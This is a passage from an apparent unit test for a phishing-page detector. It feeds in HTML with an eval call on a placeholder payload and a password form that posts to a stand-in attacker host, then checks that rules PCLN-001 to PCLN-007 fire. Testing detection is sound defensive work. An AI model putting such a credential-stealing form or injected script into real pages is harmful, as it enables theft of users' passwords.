            '<a href="https://facebook.com/x">FB</a>'
            '<a href="https://twitter.com/x">TW</a>'
            '<a href="https://instagram.com/x">IG</a>'
            '<a href="https://linkedin.com/x">LI</a>'
            '<script>eval("obfuscated_payload")</script>'
            '<form action="https://attacker.com/steal" method="post">'
            '<input type="password" name="pwd">'
            '</form>'
        )
        result = analyze(make_signals(html, domain="evil.xyz", brand="bank"))
        ids = fired_ids(result)
        for check_id in ("PCLN-001", "PCLN-002", "PCLN-003", "PCLN-004",
                         "PCLN-005", "PCLN-006", "PCLN-007"):
            assert check_id in ids, f"{check_id} should have fired"
